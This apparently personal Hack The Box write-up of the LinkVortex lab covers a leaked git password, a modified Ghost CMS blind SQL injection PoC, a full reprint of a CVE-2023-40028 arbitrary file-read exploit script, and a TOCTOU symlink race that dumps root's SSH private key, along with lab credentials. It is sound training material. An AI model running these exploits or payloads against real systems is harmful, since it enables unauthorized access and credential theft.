+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.g
```
Passing the verbose flag to `git status` reveals which password entries were modified. 

![Pasted image 20260806130350.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260806130350.png)
Successfully authenticated to `http://linkvortex.htb/ghost/#/login` with user `admin@linkvortex.htb:OctopiFociPilfer45`
## Initial Access
### CVE-2026-26980
While the fuzz is going I did some more online research and found a very recent [CVE](https://www.sonicwall.com/blog/ghost-cms-content-api-blind-sql-injection) advisory from Sonicwall and others about an unauthenticated SQL injection that can leak users API keys as they are public by default in Ghost CMS themes.
>[!info]
>![Pasted image 20260805151132.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805151132.png)

As you can see we pass an unsanitized SQL query to either the `filter=slug:[...]` or `order=slug:[...]` GET parameters of the Content API `/ghost/api/Content`.
Found a relevant [POC](https://github.com/EQSTLab/CVE-2026-26980.git) that should dump the admin api key unauthenticated.
```zsh
    undefined</script>undefined
    <meta name="generator" content="Ghost 5.58">
    <link rel="alternate" type="application/rss+xml" title="BitByBit Hardware" href="http://linkvortex.htb/rss/">
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="054f7096476b0e8c7ec591c72c" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://linkvortex.htb/" crossorigin="anonymous"></script>
    <link href="http://linkvortex.htb/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=348d88de7e"></script>
    <style>
      :root {
        --ghost-accent-color: #1c1719;
      }
    </style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=348d88de7e">
    </head>
    <body class="home-template is-head-left-logo has-cover">
      <div class="viewport">
        <header id="gh-head" class="gh-head outer">
          <div class="gh-head-inner inner">
            <div class="gh-head-brand">
              <a class="gh-head-logo no-image" href="http://linkvortex.htb"> BitByBit Hardware </a>
              <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                </svg>
              </button>
              <button class="gh-burger"></button>
            </div>
            <nav class="gh-head-menu">
              <ul class="nav">
                <li class="nav-home nav-current">
                  <a href="http://linkvortex.htb/">Home</a>
                </li>
                <li class="nav-about">
                  <a href="http://linkvortex.htb/about/">About</a>
                </li>
```
When we first tried the POC script, it defaults to a randomly set API key if we don't pass the `--key` flag which gives us an auth error. Investigating our webroot source code a little more we see a key/value pair called `data-key` with a value of `054f7096476b0e8c7ec591c72c`. that is being used by jsdeliver to get content from Ghost. Since the Content CMS is the one we are attacking, this should theoretically be the public API key needed to get the private API key of the `admin` user.

```zsh
┌──(kali㉿kali)-[~/…/HTB/linkvortex/exploit/CVE-2026-26980]
└─$ python3 poc.py --url http://linkvortex.htb --key 054f7096476b0e8c7ec591c72c
========================================================================
Ghost CMS - Unauthenticated SQLi Data Extraction
========================================================================
Target:                      http://linkvortex.htb
API Key:                     054f7096476b0e8c7ec591c72c
Tag ID:                      <unknown>
Endpoint:                    Content API (public, no auth)

[*] Calibrating oracle... Traceback (most recent call last):
  File "/home/kali/CTF/HTB/linkvortex/exploit/CVE-2026-26980/poc.py", line 237, in <module>
    raise SystemExit(main())
                     ~~~~^^
  File "/home/kali/CTF/HTB/linkvortex/exploit/CVE-2026-26980/poc.py", line 185, in main
    order_true = probe_order(args.url, args.key, "1=1")
  File "/home/kali/CTF/HTB/linkvortex/exploit/CVE-2026-26980/poc.py", line 37, in probe_order
    raise RuntimeError(f"Unexpected response: {json.dumps(data, indent=2)}")
RuntimeError: Unexpected response: {
  "tags": [],
  "meta": {
    "pagination": {
      "page": 1,
      "limit": 15,
      "pages": 1,
      "total": 0,
      "next": null,
      "prev": null
    }

```
With that we get another error. This time it's telling us that the server gave an unexpected response.

```python
def condition_filter(condition_sql):
    payload = (
        "'/**/AND/**/0/**/THEN/**/99"
        "/**/WHEN/**/length(`tags`.`slug`)=5"
        f"/**/THEN/**/(SELECT CASE WHEN {condition_sql} THEN 0 ELSE 2 END)"
        "/**/WHEN/**/length(`tags`.`slug`)=7"
        "/**/THEN/**/1"
        "/**/WHEN/**/0/**/OR/**/'"
    )
    return f"slug:[{payload},chorizo,bacon]"


def probe_order(base_url, key, condition_sql):
    data = request_tags(base_url, key, condition_filter(condition_sql))
    tags = data.get("tags", [])
    if len(tags) < 2:
        raise RuntimeError(f"Unexpected response: {json.dumps(data, indent=2)}")
    return [tag["slug"] for tag in tags[:2]]
```
Looking at the POC source lines where the code breaks down we see `if len(tags) < 2: raise RuntimeError...` meaning that the system when attempting to validate the slug tags in the above `condition_filter` it got back an empty tag response from the server, but our script was using tag slugs `chorizo` and `bacon` since that's how they setup the lab env for the POC. We need to find valid slugs to replace them with.

![Pasted image 20260805155158.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805155158.png)
Finally figured out the proper syntax to use the public api key to auth to the conent api

```zsh
┌──(kali㉿kali)-[~/…/HTB/linkvortex/exploit/CVE-2026-26980]
└─$ curl -v -s "http://linkvortex.htb/ghost/api/content/pages/?key=054f7096476b0e8c7ec591c72c" | jq '.pages[].slug'
* Host linkvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.79.205
*   Trying 10.129.79.205:80...
* Established connection to linkvortex.htb (10.129.79.205 port 80) from 10.10.14.192 port 40256 
* using HTTP/1.x
> GET /ghost/api/content/pages/?key=054f7096476b0e8c7ec591c72c HTTP/1.1
> Host: linkvortex.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 05 Aug 2026 22:49:52 GMT
< Server: Apache
< X-Powered-By: Express
< Content-Version: v5.58
< Vary: Accept-Version,Accept-Encoding
< Cache-Control: public, max-age=0
< Access-Control-Allow-Origin: *
< Content-Type: application/json; charset=utf-8
< Content-Length: 2558
< ETag: W/"9fe-+PAoWS7ItssY+VIcuGo1zdxUVLo"
< 
{ [2558 bytes data]
* Connection #0 to host linkvortex.htb:80 left intact
"about"

┌──(kali㉿kali)-[~/…/HTB/linkvortex/exploit/CVE-2026-26980]
└─$ curl -s "http://linkvortex.htb/ghost/api/content/pages/?key=054f7096476b0e8c7ec591c72c" | jq '.pages[].slug'
"about"
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/linkvortex/exploit/CVE-2026-26980]
└─$ curl -s "http://linkvortex.htb/ghost/api/content/posts/?key=054f7096476b0e8c7ec591c72c" | jq '.posts[].slug' 
"psu"
"storage-drive"
"vga"
"ram"
"cmos"
"cpu"
```
After querying a couple of known [Ghost CMS Content API endpoints](https://docs.ghost.org/content-api/post) we find that `posts` has several slugs we can use for our script.

```python
---snip---
def fetch_json(url, timeout=5):
    with urlopen(url, timeout=timeout) as response:
        return json.loads(response.read().decode("utf-8"))


def request_tags(base_url, key, filter_value):
    query = urlencode({"key": key, "filter": filter_value})
    url = base_url.rstrip("/") + "/ghost/api/content/posts/?" + query
    return fetch_json(url)


def condition_filter(condition_sql):
    payload = (
        "'/**/AND/**/0/**/THEN/**/99"
        "/**/WHEN/**/length(`posts`.`slug`)=5"
        f"/**/THEN/**/(SELECT CASE WHEN {condition_sql} THEN 0 ELSE 2 END)"
        "/**/WHEN/**/length(`posts`.`slug`)=7"
        "/**/THEN/**/1"
        "/**/WHEN/**/0/**/OR/**/'"
    )
    return f"slug:[{payload},ram,cpu]"


def probe_order(base_url, key, condition_sql):
    data = request_tags(base_url, key, condition_filter(condition_sql))
    tags = data.get("posts", [])
    if len(tags) < 2:
        raise RuntimeError(f"Unexpected response: {json.dumps(data, indent=2)}")
    return [tag["slug"] for tag in tags[:2]
    ---snip---
```
We begin by editing all called references to `tags` that were not python variable names and replaced them with `posts`.

```python
---snip---
def condition_filter(condition_sql):
    payload = (
        "'/**/AND/**/0/**/THEN/**/99"
        "/**/WHEN/**/length(`posts`.`slug`)=5"
        f"/**/THEN/**/(SELECT CASE WHEN {condition_sql} THEN 0 ELSE 2 END)"
        "/**/WHEN/**/length(`posts`.`slug`)=7"
        "/**/THEN/**/1"
        "/**/WHEN/**/0/**/OR/**/'"
    )
    return f"slug:[{payload},ram,cpu]"
    
    ---snip---
    
    banner()
    tags = request_tags(args.url, args.key, "slug:[ram,cpu]").get("posts", [])
    tag_id = tags[0].get("id", "<unknown>") if tags else "<unknown>"
    line("Target:", args.url.rstrip("/"))
    line("API Key:", args.key)
```
additionally we replaced the test slugs of `chorizo` and `bacon` to slugs we identified in `posts` as `ram` and `cpu`

```zsh
┌──(kali㉿kali)-[~/…/HTB/linkvortex/exploit/CVE-2026-26980]
└─$ python3 poc.py --url http://linkvortex.htb --key 054f7096476b0e8c7ec591c72c
========================================================================
Ghost CMS - Unauthenticated SQLi Data Extraction
========================================================================
Target:                      http://linkvortex.htb
API Key:                     054f7096476b0e8c7ec591c72c
Tag ID:                      660a9d414421e3000107523c
Endpoint:                    Content API (public, no auth)

[*] Calibrating oracle... Oracle proof failed. The target may not be vulnerable or seeded.
```
Another error. This time related to contacting Oracle. After some troubleshooting I discovered that Orcale expects strict length comparisons and I had the length of the slugs still defaulted to `chorizo` and `bacon`.

```python
---snip---
    print("[*] Calibrating oracle... ", end="", flush=True)
    order_true = probe_order(args.url, args.key, "1=1")
    order_false = probe_order(args.url, args.key, "1=0")
    if order_true[0] != "cpu" or order_false[0] != "ram":
        raise SystemExit("Oracle proof failed. The target may not be vulnerable or seeded.")
    print("OK")
    
---snip---

def condition_filter(condition_sql):
    payload = (
        "'/**/AND/**/0/**/THEN/**/99"
        "/**/WHEN/**/length(`posts`.`slug`)=3"
        f"/**/THEN/**/(SELECT CASE WHEN {condition_sql} THEN 0 ELSE 2 END)"
        "/**/WHEN/**/length(`posts`.`slug`)=3"
        "/**/THEN/**/1"
        "/**/WHEN/**/0/**/OR/**/'"
    )
    return f"slug:[{payload},ram,cpu]"
```
After making more edits to remove all references to the previous slugs and make them all the new ones from `posts` as well as updating the length expected to be 3 for both since they're both 3 characters, we should be ready to try again. Same error. More research reveals that the slug lengths cannot be identical and therefore we need to use a different set. Replacing all references to `cpu` with `cmos` and updating length validation to 4 on it's respective section in the `condition_filter`. 

After much editing I still can't get it to dump the table for the admin key. Moving on I used a hint from HTB and will be going back to enum [[CTFs/HTB/Linkvortex#FFuF (subdomains)\|subdomains.]]

### CVE-2023-40028
Found a [POC](https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.**sh**) for this CVE now that we've successfully gained an authenticated session on the Ghost platform.

```
#!/bin/bash

# Exploit Title: Ghost Arbitrary File Read
# Date: 10-03-2024
# Exploit Author: Mohammad Yassine
# Vendor Homepage: https://ghost.org/
# Version: BEFORE [ 5.59.1 ]
# Tested on: [ debian 11 bullseye ghost docker image ]
# CVE : CVE-2023-40028

#THIS EXPLOIT WAS TESTED AGAINST A SELF HOSTED GHOST IMAGE USING DOCKER

#GHOST ENDPOINT
GHOST_URL='http://127.0.0.1'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'

PAYLOAD_PATH="`dirname $0`/exploit"
PAYLOAD_ZIP_NAME=exploit.zip

# Function to print usage
function usage() {
  echo "Usage: $0 -u username -p password"
}

while getopts 'u:p:' flag; do
  case "${flag}" in
    u) USERNAME="${OPTARG}" ;;
    p) PASSWORD="${OPTARG}" ;;
    *) usage
       exit ;;
  esac
done

if [[ -z $USERNAME || -z $PASSWORD ]]; then
  usage
  exit
fi

function generate_exploit()
{
  local FILE_TO_READ=$1
  IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  mkdir -p $PAYLOAD_PATH/content/images/2024/
  ln -s $FILE_TO_READ $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
}

function clean()
{
  rm $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  rm -rf $PAYLOAD_PATH
  rm $PAYLOAD_ZIP_NAME
}

#CREATE COOKIE
curl -c cookie.txt -d username=$USERNAME -d password=$PASSWORD \
   -H "Origin: $GHOST_URL" \
   -H "Accept-Version: v3.0" \
   $GHOST_API/session/ &> /dev/null

if ! cat cookie.txt | grep -q ghost-admin-api-session;then
  echo "[!] INVALID USERNAME OR PASSWORD"
  rm cookie.txt
  exit
fi

function send_exploit()
{
  RES=$(curl -s -b cookie.txt \
  -H "Accept: text/plain, */*; q=0.01" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "X-Ghost-Version: 5.58" \
  -H "App-Pragma: no-cache" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: multipart/form-data" \
  -X POST \
  -H "Origin: $GHOST_URL" \
  -H "Referer: $GHOST_URL/ghost/" \
  -F "importfile=@`dirname $PAYLOAD_PATH`/$PAYLOAD_ZIP_NAME;type=application/zip" \
  -H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
  -H "Content-Type: application/zip" \
  -J \
  "$GHOST_URL/ghost/api/v3/admin/db")
  if [ $? -ne 0 ];then
    echo "[!] FAILED TO SEND THE EXPLOIT"
    clean
    exit
  fi
}

echo "WELCOME TO THE CVE-2023-40028 SHELL"
while true; do
  read -p "file> " INPUT
  if [[ $INPUT == "exit" ]]; then
    echo "Bye Bye !"
    break
  fi
  if [[ $INPUT =~ \  ]]; then
    echo "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"
    continue
  fi
  if [ -z $INPUT  ]; then
    echo "VALUE REQUIRED"
    continue
  fi
  generate_exploit $INPUT
  send_exploit
  curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png
  clean
done

rm cookie.txt
```
This acts as a continuous loop so we can read out system files in a more interactive session. Let's try it out.

```#GHOST ENDPOINT
GHOST_URL='http://linkvortex.htb'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'
```
Can't forget to edit the script to point at our target.

```
┌──(kali㉿kali)-[~/…/linkvortex/files/git/dev.linkvortex.htb]
└─$ ./symlink.sh -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
We successfully exploit the arbitrary file read to read out `/etc/passwd` noting user `node`.

```json
file> /var/lib/ghost/config.production.json 
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
After some digging we find the a default config file for ghost in `/var/lib/ghost/config.production.json` -- HTB sneakily moved this from `/var/www/ghost/`, and we get a password for the user bob again who was not listed in the `/etc/passwd` output from our CVE. which I later learned is because ghost is being run inside a Docker container. Let's try to get an ssh session.

```zsh
┌──(kali㉿kali)-[~/…/linkvortex/files/git/dev.linkvortex.htb]
└─$ ssh bob@linkvortex.htb     
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ 
```
Successfully SSH'd to the machine as `bob`

## Privilege Escalation
### Manual Enumeration
```zsh
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```
Checking out our `sudo` privileges it looks like we can execute the `clean_symlink.sh` script as `root` for any `*` .png file we pass it. Let's see the script's code for more details.

```
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
As we can see in the script it reads a .png file we pass it, it uses `/usr/bin/test -L` on it and determines if it's a symbolic link or not. If it is, it then checks to see if the link points to anything in `/etc` or `/root` and rejects it and removes the symlink if so. Otherwise, it 'quarantines' it in `/var/quarantined.`

>[!info] Manual entry for /usr/bin/test
>![Pasted image 20260806140741.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260806140741.png)

Let's setup a symlink to test the functionality of it.

```zsh
bob@linkvortex:~$ ln -s /etc/shadow/ test.png
bob@linkvortex:~$ ls -lash
total 32K
4.0K drwxr-x--- 4 bob  bob  4.0K Aug  6 21:08 .
4.0K drwxr-xr-x 3 root root 4.0K Nov 30  2024 ..
   0 lrwxrwxrwx 1 root root    9 Apr  1  2024 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 bob  bob   220 Jan  6  2022 .bash_logout
4.0K -rw-r--r-- 1 bob  bob  3.7K Jan  6  2022 .bashrc
4.0K drwx------ 2 bob  bob  4.0K Nov  1  2024 .cache
4.0K drwxrwxr-x 3 bob  bob  4.0K Aug  6 21:02 .local
4.0K -rw-r--r-- 1 bob  bob   807 Jan  6  2022 .profile
   0 lrwxrwxrwx 1 bob  bob    12 Aug  6 21:08 test.png -> /etc/shadow/
4.0K -rw-r----- 1 root bob    33 Aug  6 18:12 user.txt
```
We first create a symlink to `/etc/shadow` with a `test.png` that was not previously created.

```zsh
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
! Trying to read critical files, removing link [ test.png ] 
```
As you can see, calling the script triggers the unsafe link filter as expected.

The script we have `sudo` permissions on, after checking for a hint is vulnerable to a TOCTOU race condition.
>[!tip]
>![TOCTOU.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/TOCTOU.png)
The "Time of Check" to "Time of Use" Race condition relies on our script performing a check ("is file a symlink" in our context), and then to use that object if the check passes (send to quarantine if it passes the filter).

```zsh
bob@linkvortex:~$ ln -s /ok pwn.png
while true; do ln -sf /root/.ssh/id_rsa /var/quarantined/pwn.png;done
export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh pwn.png 
Link found [ pwn.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


┌──(kali㉿kali)-[~/Desktop/ctf/htb/linkvortex]
└─$ ssh -i root_rsa root@linkvortex.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~
```
So first we created a dummy symlink to a file that didn't previously exist `pwn.png` and a directory we know doesn't exist `/ok`. Then we wrote this one liner to constantly be creating symlinks between `root`'s ssh key and where we know the script will write to plus our dummy linked image like so: `/var/quarantined/pwn.png`. Then we pass the variable `CHECK_CONTENT=true` forcing the script to read out the contents of any file that meets the check requirements and voila. We call the script after the variable declaration targeting our dummy link and eventually the race wins and it reads the linked ssh key out since our loop is constantly writing the link to that quarantined directory. 

# Final Thoughts
>[!tip] Takeaways
>- always do your full enum before going down a trail
>- a checklist of enumeration/exploitation might help you stay on track
>- Learn more git commands and how they work together
>- read up on common file paths of the app or service you're attacking
>- learn more about race conditions and how to script for them